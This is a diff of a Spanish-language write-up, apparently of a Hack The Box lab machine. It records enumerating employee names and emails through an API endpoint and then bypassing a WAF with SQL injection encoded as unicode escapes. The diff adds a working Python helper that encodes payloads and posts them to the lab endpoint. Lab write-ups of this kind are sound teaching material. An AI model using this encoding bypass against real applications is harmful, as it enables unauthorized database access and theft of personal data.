@@ -83,6 +83,8 @@ incluyendo nombre, rol profesional y dirección de correo electrónico.
 que  se  procedió  a  interceptar la  solicitud  mediante  Burp  Suite,  reenviándola  posteriormente  al  módulo
 Repeater para su análisis exhaustivo.
 
+<img src="assets/10.jpg"> 
+
 La inspección de la petición reveló un POST dirigido al endpoint /api/getColleagues, con un parámetro
 name encapsulado en un cuerpo JSON. La respuesta del servidor, igualmente en formato JSON, incluía los
 campos id, name, position, email y src, lo que confirmaba la existencia de un servicio de enumeración de
@@ -92,18 +94,20 @@ Para validar la consistencia del endpoint y facilitar la extracción masiva de d
 solicitud  mediante  cURL,  procesando  la  salida  con  jq  para  obtener  una  representación  estructurada  y
 manipulable de la información devuelta por el servidor.
 
+<img src="assets/11.jpg"> 
+
 Del mismo modo que en el caso de los nombres, la extracción de direcciones de correo electrónico resultó
 igualmente trivial, permitiendo consolidar ambos conjuntos de datos en archivos independientes (names.txt
 y emails.txt) para su posterior explotación en fases avanzadas de enumeración.
 
-19 de agosto de 2026
-
-7
+<img src="assets/12.jpg"> 
 
 El comportamiento del endpoint sugiere de manera inequívoca que la consulta está siendo delegada a un
 motor de base de datos, lo que convierte a este vector en un candidato idóneo para evaluar la presencia de
 vulnerabilidades  de  inyección  SQL.  Como  aproximación  inicial,  se  procedió  a  introducir  un  apóstrofo
 aislado en el parámetro de búsqueda con el fin de observar la reacción del backend.
+
+<img src="assets/13.jpg"> 
 
 La  respuesta  del  servidor  consistió  en  un  403  Forbidden,  lo  que  constituye  un  indicio  razonable  de  la
 existencia de mecanismos de filtrado de entrada, ya sea implementados en la propia lógica de la aplicación
@@ -111,13 +115,66 @@ o mediante un Web Application Firewall. Ante este tipo de restricciones, una est
 en explorar variantes de codificación alternativas que puedan ser aceptadas por el parser JSON antes de
 alcanzar la capa de filtrado.
 
+<img src="assets/14.jpg"> 
+
 El  análisis  de  la  especificación  RFC  correspondiente  revela  que,  aunque  la  codificación  por  defecto  es
 UTF-8, el estándar contempla también UTF-16 y UTF-32, lo que abre la posibilidad de introducir cargas
 útiles en formatos no previstos por los controles de seguridad.
 
-19 de agosto de 2026
+```python
+#!/usr/bin/python3
+import sys, signal, requests, json
+def exit_handler(sig, frame):
+	print("\n[!] Saliendo de la aplicacion...")
+	sys.exit(1)
+	
+#evento para controlar la salida de la aplicacion con Ctrl+C
+signal.signal(signal.SIGINT, exit_handler)
 
-8
+def convert_input():
+    while True:
+        output = input('MULTIMASTER> ').strip()
+        if not output: continue
+
+        if output.lower() == 'exit':
+            break
+        
+
+        utf = [f"\\u00{ord(i):02x}" for i in output]
+
+        data_post = ''.join(utf)
+        print(f"[+] Convirtiendo payload: {data_post}")
+
+        injection_sql(data_post)
+
+def injection_sql(datos):
+    print("[+] Injectando respuesta en la peticion web")
+    base_url = 'http://megacorp.local/api/getColleagues'
+
+    try:
+        #data_json = '{"name":"' + datos + '"}'
+        data_json = f'{{"name":"{datos}"}}'
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+            "Content-Type": "application/json;charset=utf-8",
+        }
+
+        response = requests.post(base_url, headers=headers, data=data_json)
+        response.raise_for_status()
+
+        print("[+] Peticion exitosa \n[+] Mostrando respuesta:")
+        json_ordenado = json.loads(response.text)
+        print(json.dumps(json_ordenado, indent=2, ensure_ascii=False))
+
+    except requests.exceptions.RequestException as e:
+         print(f"Ha habido un error en las peticiones HTML: {e}")
+    except json.JSONDecodeError as e:
+         print(f"Probablemente la respuesta no sea un JSON {e}")
+
+if __name__ == '__main__':
+    convert_input()
+```
 
 La inyección de un apóstrofo codificado en UTF-16 no generó ningún error, lo que justificó profundizar en
 esta vía de explotación. Para ello, se recurrió a un conversor en línea y, posteriormente, a un script en Python
